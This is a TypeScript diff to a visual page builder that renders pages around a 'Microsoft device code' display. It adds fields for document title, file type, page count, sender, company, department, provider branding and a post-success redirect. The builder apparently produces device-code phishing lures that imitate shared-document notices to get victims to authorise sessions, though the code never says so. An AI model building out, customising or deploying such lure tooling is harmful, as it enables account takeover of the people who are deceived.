@@ -55,6 +55,7 @@ export type PageNode = {
   hideDesktop?: boolean;
   hideMobile?: boolean;
   locked?: boolean;
+  visibleWhen?: string[];
   children?: PageNode[];
 };
 
@@ -86,13 +87,29 @@ export type BuilderConfiguration = {
   steps: [string, string, string];
   continueButtonText: string;
   footer: string;
+  successMessage?: string;
+  redirectText?: string;
   primaryColor: string;
   background: string;
   documentName: string;
+  documentTitle?: string;
+  fileType?: string;
+  pageCount?: string;
+  fileSize?: string;
+  sender?: string;
+  companyName?: string;
+  department?: string;
+  documentStatus?: string;
   logoMode: "provider" | "company" | "both" | "none";
   logoSize: "small" | "medium" | "large";
   logoAlignment: "left" | "center" | "right";
   logoSpacing: number;
+  logoWidth?: number;
+  logoMaxHeight?: number;
+  logoBackground?: "none" | "white" | "dark";
+  showProviderName?: boolean;
+  providerLogoId?: string;
+  companyBuiltinLogoId?: string;
   companyLogoAssetId?: string;
   redirectUrl?: string;
   redirectDelay: "immediate" | "1" | "3" | "5" | "10" | "never";
@@ -146,6 +163,7 @@ export const pageNodeSchema: z.ZodType<PageNode> = z.lazy(() => z.object({
   hideDesktop: z.boolean().optional(),
   hideMobile: z.boolean().optional(),
   locked: z.boolean().optional(),
+  visibleWhen: z.array(z.string().max(30)).max(12).optional(),
   children: z.array(pageNodeSchema).max(100).optional(),
 }).strict());
 
@@ -172,13 +190,29 @@ export const pageDocumentSchema: z.ZodType<PageDocument> = z.object({
       steps: z.tuple([z.string().max(500), z.string().max(500), z.string().max(500)]),
       continueButtonText: z.string().min(1).max(100),
       footer: z.string().max(500),
+      successMessage: z.string().max(500).optional(),
+      redirectText: z.string().max(200).optional(),
       primaryColor: z.string().regex(/^#[0-9a-fA-F]{6}$/),
       background: z.string().max(500),
       documentName: z.string().max(200),
+      documentTitle: z.string().max(200).optional(),
+      fileType: z.string().max(80).optional(),
+      pageCount: z.string().max(80).optional(),
+      fileSize: z.string().max(80).optional(),
+      sender: z.string().max(120).optional(),
+      companyName: z.string().max(120).optional(),
+      department: z.string().max(120).optional(),
+      documentStatus: z.string().max(120).optional(),
       logoMode: z.enum(["provider", "company", "both", "none"]),
       logoSize: z.enum(["small", "medium", "large"]),
       logoAlignment: z.enum(["left", "center", "right"]),
       logoSpacing: z.number().int().min(0).max(80),
+      logoWidth: z.number().int().min(40).max(480).optional(),
+      logoMaxHeight: z.number().int().min(24).max(200).optional(),
+      logoBackground: z.enum(["none", "white", "dark"]).optional(),
+      showProviderName: z.boolean().optional(),
+      providerLogoId: z.string().max(100).optional(),
+      companyBuiltinLogoId: z.string().max(100).optional(),
       companyLogoAssetId: z.string().max(100).optional(),
       redirectUrl: z.string().max(2000).refine((value) => !value || isSafeRedirectUrl(value), "Redirect must use HTTPS or local HTTP").optional(),
       redirectDelay: z.enum(["immediate", "1", "3", "5", "10", "never"]),
@@ -209,8 +243,10 @@ export function renderPageDocument(
     document.settings.backgroundImage ? `background-image:url("${safeUrl(document.settings.backgroundImage)}")` : "",
     `color:${safeCss(document.settings.color)}`,
     `font-family:${safeCss(document.settings.fontFamily)}`,
+    document.settings.builder?.primaryColor ? `--theme-color:${safeCss(document.settings.builder.primaryColor)}` : "",
+    document.settings.builder?.primaryColor ? `--theme-foreground:${contrastColor(document.settings.builder.primaryColor)}` : "",
   ].filter(Boolean).join(";");
-  const html = document.nodes.filter((node) => !node.hidden).map((node) => renderNode(node, options)).join("");
+  const html = document.nodes.filter((node) => !node.hidden && visibleForStatus(node, options.status)).map((node) => renderNode(node, options)).join("");
   return {
     html: `<main class="visual-page" style="${escapeAttribute(bodyStyle)}">${html}</main>`,
     css: baseDocumentCss(document.settings.maxWidth),
@@ -220,11 +256,12 @@ export function renderPageDocument(
 function renderNode(node: PageNode, options: { deviceCode?: string; verificationUri?: string; status?: string; assetUrl?: (id: string) => string }): string {
   const classes = [`pb-${node.type}`, node.hideDesktop ? "pb-hide-desktop" : "", node.hideMobile ? "pb-hide-mobile" : ""].filter(Boolean).join(" ");
   const style = styleText(node.style);
-  const children = node.children?.filter((child) => !child.hidden).map((child) => renderNode(child, options)).join("") ?? "";
+  const children = node.children?.filter((child) => !child.hidden && visibleForStatus(child, options.status)).map((child) => renderNode(child, options)).join("") ?? "";
   const attrs = `class="${classes}" style="${escapeAttribute(style)}" data-node-id="${escapeAttribute(node.id)}"`;
   switch (node.type) {
-    case "section": case "header": case "footer": case "card": case "callout":
+    case "section": case "header": case "footer": case "card":
       return `<${node.type === "section" ? "section" : node.type === "header" ? "header" : node.type === "footer" ? "footer" : "div"} ${attrs}>${children}</${node.type === "section" ? "section" : node.type === "header" ? "header" : node.type === "footer" ? "footer" : "div"}>`;
+    case "callout": return `<div ${attrs}>${node.content ? safeRichText(node.content) : ""}${children}</div>`;
     case "columns": return `<div ${attrs}>${children}</div>`;
     case "heading": return `<h2 ${attrs}>${escapeHtml(node.content ?? "Heading")}</h2>`;
     case "text": return `<div ${attrs}>${safeRichText(node.content ?? "Text")}</div>`;
@@ -238,8 +275,8 @@ function renderNode(node: PageNode, options: { deviceCode?: string; verification
       return `<img ${attrs} src="${escapeAttribute(safeUrl(src))}" alt="${escapeAttribute(node.alt ?? "")}">`;
     }
     case "providerLogo": {
-      const source = node.assetId && options.assetUrl ? options.assetUrl(node.assetId) : "";
-      return `<div ${attrs}>${source ? `<img src="${escapeAttribute(safeUrl(source))}" alt="${escapeAttribute(node.alt ?? "Company logo")}">` : providerLogo(node.provider ?? "company")}</div>`;
+      const source = node.assetId && options.assetUrl ? options.assetUrl(node.assetId) : node.src ?? "";
+      return `<div ${attrs}>${source ? `<span class="provider-logo"><img src="${escapeAttribute(safeUrl(source))}" alt="${escapeAttribute(node.alt ?? "Provider logo")}">${node.content ? `<span>${escapeHtml(node.content)}</span>` : ""}</span>` : providerLogo(node.provider ?? "company")}</div>`;
     }
     case "deviceCode": return `<div ${attrs}><span>${escapeHtml(node.content ?? "Microsoft device code")}</span><strong data-dynamic="microsoft-device-code">${escapeHtml(options.deviceCode ?? "XXXX-XXXX")}</strong></div>`;
     case "status": {
@@ -252,6 +289,13 @@ function renderNode(node: PageNode, options: { deviceCode?: string; verification
     case "badge": return `<span ${attrs}>${escapeHtml(node.content ?? "Badge")}</span>`;
     case "navigation": return `<nav ${attrs}>${children}</nav>`;
   }
+}
+
+function visibleForStatus(node: PageNode, status?: string) {
+  if (!node.visibleWhen?.length) return true;
+  const normalized = (status ?? "waiting").toLowerCase();
+  const state = normalized === "connected" || normalized === "authorized" ? "success" : normalized === "failed" ? "error" : normalized === "pending" ? "waiting" : normalized;
+  return node.visibleWhen.includes(normalized) || node.visibleWhen.includes(state);
 }
 
 function styleText(style: NodeStyle = {}) {
@@ -297,9 +341,16 @@ function safeUrl(value: string) {
   try { const url = new URL(value); return ["https:", "http:"].includes(url.protocol) ? url.toString() : "#"; } catch { return "#"; }
 }
 function safeCss(value: string) { return value.replace(/[<>{};]/g, "").replace(/url\s*\(/gi, ""); }
+function contrastColor(value: string) {
+  const match = /^#([0-9a-f]{6})$/i.exec(value);
+  if (!match) return "#ffffff";
+  const color = Number.parseInt(match[1], 16);
+  const luminance = ((color >> 16) * 299 + ((color >> 8) & 255) * 587 + (color & 255) * 114) / 1000;
+  return luminance > 160 ? "#172033" : "#ffffff";
+}
 function escapeHtml(value: string) { return value.replace(/[&<>"']/g, (character) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[character]!); }
 function escapeAttribute(value: string) { return escapeHtml(value); }
 
 function baseDocumentCss(maxWidth: string) {
-  return `[hidden]{display:none!important}.visual-page{min-height:100vh;width:100%;background-size:cover;background-position:center}.visual-page>*{box-sizing:border-box}.pb-section{padding:64px 24px}.pb-section>*{max-width:${safeCss(maxWidth)};margin-left:auto;margin-right:auto}.pb-header,.pb-footer,.pb-navigation{display:flex;align-items:center;justify-content:space-between;gap:24px;padding:20px 32px}.pb-columns{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:32px}.pb-card,.pb-callout{padding:28px;border:1px solid #dce3ef;border-radius:18px;background:#fff;box-shadow:0 16px 48px #17203312}.pb-heading{font-size:clamp(2rem,5vw,4rem);line-height:1.08;letter-spacing:-.045em;margin:0 0 18px}.pb-text{font-size:1.05rem;line-height:1.7;margin:0 0 20px}.pb-button{display:inline-flex;align-items:center;justify-content:center;padding:13px 20px;border-radius:10px;background:#3157d5;color:#fff;text-decoration:none;font-weight:700;margin:4px}.pb-image{display:block;max-width:100%;object-fit:cover}.pb-logo,.pb-providerLogo img{display:block;max-width:100%;max-height:100px;object-fit:contain}.pb-deviceCode{display:grid;gap:8px;padding:20px;border-radius:14px;background:#f1f5ff;text-align:center}.pb-deviceCode span{font-size:.75rem;text-transform:uppercase;letter-spacing:.1em}.pb-deviceCode strong{font:800 clamp(2rem,6vw,3.4rem)/1 ui-monospace,monospace;letter-spacing:.12em}.pb-status{display:inline-flex;align-items:center;gap:8px;padding:8px 12px;border-radius:99px;background:#eef2f8;font-weight:650}.pb-status-dot{width:8px;height:8px;border-radius:50%;background:#e69a18}.pb-steps{display:grid;gap:16px;counter-reset:steps;list-style:none;padding:0}.pb-steps li{display:flex;gap:12px;line-height:1.6}.pb-steps li:before{counter-increment:steps;content:counter(steps);width:28px;height:28px;flex:0 0 auto;border-radius:50%;display:grid;place-items:center;background:#3157d5;color:#fff;font-weight:700}.pb-resourceCard{display:flex;gap:18px;padding:22px;border:1px solid #dce3ef;border-radius:14px;background:#fff}.provider-logo{display:inline-flex;align-items:center;gap:10px;font-weight:700}.provider-logo b{width:34px;height:34px;border-radius:9px;display:grid;place-items:center;background:var(--provider-color);color:#fff}.pb-badge{display:inline-block;padding:6px 10px;border-radius:99px;background:#eaf0ff;color:#3157d5;font-weight:700;font-size:.75rem}.pb-divider{border:0;border-top:1px solid #dce3ef;margin:24px 0}@media(max-width:700px){.pb-hide-mobile{display:none!important}.pb-section{padding:40px 18px}.pb-header,.pb-footer{padding:16px 18px}.pb-columns{grid-template-columns:1fr}.pb-heading{font-size:2.2rem}}@media(min-width:701px){.pb-hide-desktop{display:none!important}}`;
+  return `[hidden]{display:none!important}.visual-page{min-height:100vh;width:100%;background-size:cover;background-position:center;--theme-color:#3158d4;--theme-foreground:#fff}.visual-page>*{box-sizing:border-box}.pb-section{padding:32px 20px}.pb-section>*{max-width:${safeCss(maxWidth)};margin-left:auto;margin-right:auto}.pb-header,.pb-footer,.pb-navigation{display:flex;align-items:center;justify-content:space-between;gap:16px;padding:16px 24px}.pb-columns{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:24px}.pb-card,.pb-callout{padding:24px;border:1px solid #e4e7ec;border-radius:14px;background:#fff;box-shadow:0 12px 36px #1720330d}.pb-heading{font-size:clamp(1.5rem,3vw,2rem);line-height:1.16;letter-spacing:-.035em;margin:0 0 12px}.pb-text{font-size:.94rem;line-height:1.6;margin:0 0 16px}.pb-button{display:inline-flex;align-items:center;justify-content:center;padding:12px 18px;border-radius:9px;background:var(--theme-color);color:var(--theme-foreground);text-decoration:none;font-weight:650;margin:4px;transition:filter .15s,transform .15s}.pb-button:hover{filter:brightness(.94);transform:translateY(-1px)}.pb-image{display:block;max-width:100%;object-fit:cover}.pb-logo,.pb-providerLogo img{display:block;max-width:100%;max-height:100px;object-fit:contain}.pb-deviceCode{display:grid;gap:7px;padding:16px;border-radius:10px;background:color-mix(in srgb,var(--theme-color) 8%,#fff);border:1px solid color-mix(in srgb,var(--theme-color) 20%,#e4e7ec);text-align:center}.pb-deviceCode span{font-size:.68rem;text-transform:uppercase;letter-spacing:.1em;color:#667085}.pb-deviceCode strong{font:700 clamp(1.8rem,4vw,2.35rem)/1.1 ui-monospace,SFMono-Regular,Consolas,monospace;letter-spacing:.13em;color:var(--theme-color)}.pb-status{display:inline-flex;align-items:center;gap:7px;padding:6px 9px;border-radius:99px;background:#f2f4f7;color:#667085;font-size:.78rem;font-weight:580}.pb-status-dot{width:7px;height:7px;border-radius:50%;background:#e69a18}.pb-status[data-status=success] .pb-status-dot,.pb-status[data-status=connected] .pb-status-dot{background:#15906f}.pb-status[data-status=expired] .pb-status-dot,.pb-status[data-status=error] .pb-status-dot,.pb-status[data-status=failed] .pb-status-dot{background:#d92d20}.pb-steps{display:grid;gap:10px;counter-reset:steps;list-style:none;padding:0}.pb-steps li{display:flex;align-items:flex-start;gap:10px;line-height:1.48;font-size:.84rem}.pb-steps li:before{counter-increment:steps;content:counter(steps);width:22px;height:22px;flex:0 0 auto;border-radius:50%;display:grid;place-items:center;background:var(--theme-color);color:var(--theme-foreground);font-size:.7rem;font-weight:700}.pb-resourceCard{display:flex;gap:14px;padding:16px;border:1px solid #e4e7ec;border-radius:11px;background:#fff}.provider-logo{display:inline-flex;align-items:center;gap:9px;font-weight:650}.provider-logo img{width:auto;height:100%;max-width:100%;object-fit:contain}.provider-logo b{width:32px;height:32px;border-radius:8px;display:grid;place-items:center;background:var(--provider-color);color:#fff}.pb-badge{display:inline-block;padding:5px 8px;border-radius:99px;background:color-mix(in srgb,var(--theme-color) 9%,#fff);color:var(--theme-color);font-weight:650;font-size:.68rem}.pb-divider{border:0;border-top:1px solid #e4e7ec;margin:20px 0}@media(max-width:700px){.pb-hide-mobile{display:none!important}.pb-section{padding:24px 16px}.pb-header,.pb-footer{padding:14px 16px}.pb-columns{grid-template-columns:1fr!important}.pb-heading{font-size:1.65rem}}@media(min-width:701px){.pb-hide-desktop{display:none!important}}`;
 }
